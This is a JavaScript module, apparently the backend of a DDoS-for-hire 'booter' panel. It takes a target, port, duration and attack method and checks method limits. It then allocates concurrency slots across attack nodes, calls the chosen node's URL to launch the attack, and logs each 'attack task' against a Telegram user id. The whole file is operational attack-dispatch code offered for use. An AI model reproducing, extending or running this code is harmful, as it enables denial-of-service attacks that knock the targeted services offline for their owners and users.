const axios = require('axios');
const { Op } = require('sequelize');
const { Method, Api, Task } = require('@/database/models');
const logger = require("@/utils/logger");

// 内存卡槽状态
const apiSlots = {}; // { [apiId]: [timestamp, ...] }

// 获取某节点剩余卡槽
function getAvailableSlots(apiId, maxConcurrency) {
    const now = Date.now();
    if (!apiSlots[apiId]) return maxConcurrency;
    apiSlots[apiId] = apiSlots[apiId].filter(ts => ts > now);
    return maxConcurrency - apiSlots[apiId].length;
}

// 占用一个卡槽
function useSlot(apiId, cooldownSeconds) {
    if (!apiSlots[apiId]) apiSlots[apiId] = [];
    const expiresAt = Date.now() + cooldownSeconds * 1000;
    apiSlots[apiId].push(expiresAt);
}

// 替换API URL参数
function replaceApiUrl(url, params, methodName) {
    // 基本参数替换
    let result = url;
    result = result.replace(/\[target\]/gi, encodeURIComponent(params.target));
    if (/\[port\]/i.test(result)) {
        result = result.replace(/\[port\]/gi, params.port || 80);
    }
    result = result.replace(/\[time\]/gi, params.time);
    result = result.replace(/\[method\]/gi, encodeURIComponent(methodName));

    return result;
}

// attack主流程
async function submitAttackTask({ user_id, target, port, time, method_name, slot = 1 }) {
    const method = await Method.findOne({ where: { name: method_name, status: 'active' } });
    if (!method) throw new Error('不支持的方法');

    // limit_time 校验
    if (method.limit_time > 0 && Number(time) > method.limit_time) {
        throw new Error(`最大时长超限，允许上限为${method.limit_time}秒`);
    }

    const apis = await Api.findAll({
        where: {
            status: 'active',
            method_ids: { [Op.like]: `%${method.id}%` }
        }
    });
    if (!apis.length) throw new Error('没有可用节点');

    let selectedApi = null;
    for (const api of apis) {
        const maxSlots = api.max_concurrency || api.slot_limit || 1;
        const freeSlots = getAvailableSlots(api.id, maxSlots);
        if (freeSlots > 0) {
            selectedApi = api;
            break;
        }
    }
    if (!selectedApi) throw new Error('所有节点卡槽已满，请稍后再试');

    useSlot(selectedApi.id, time);

    const apiParams = {
        target,
        port: port || 80,
        time,
        method: method_name,
    };
    const apiUrl = replaceApiUrl(selectedApi.url, apiParams, method_name);

    let apiRes;
    try {
        apiRes = await axios.get(apiUrl, { timeout: 8000 });
    } catch (err) {
        throw new Error(`节点API请求失败: ${err.message}`);
    }

    // 记录任务
    const paramsForDb = {
        target,
        port: port || 80,
        time,
        method: method_name,
        slot,
        api_name: selectedApi.name,
        user_id,
        api_url: apiUrl,
    };

    const task = await Task.create({
        tg_uid: user_id,
        target,
        params: paramsForDb,
        method_name: method.name,    // ⭐️ 直接存 Method 名字
        api_name: selectedApi.name,  // ⭐️ 直接存 Api 名字
        status: 'running',
        start_time: new Date(),
    });

    logger.warn(`攻击任务: target=${target}, port=${port || 'N/A'}, time=${time}, method=${method.name}, slot=${slot}`);

    return {
        success: true,
        task_id: task.id,
        api: selectedApi.name,
        api_response: apiRes.data,
        message: `任务已分配节点：${selectedApi.name}`
    };
}



module.exports = {
    submitAttackTask,
    getAvailableSlots,
    useSlot,
    apiSlots,
};
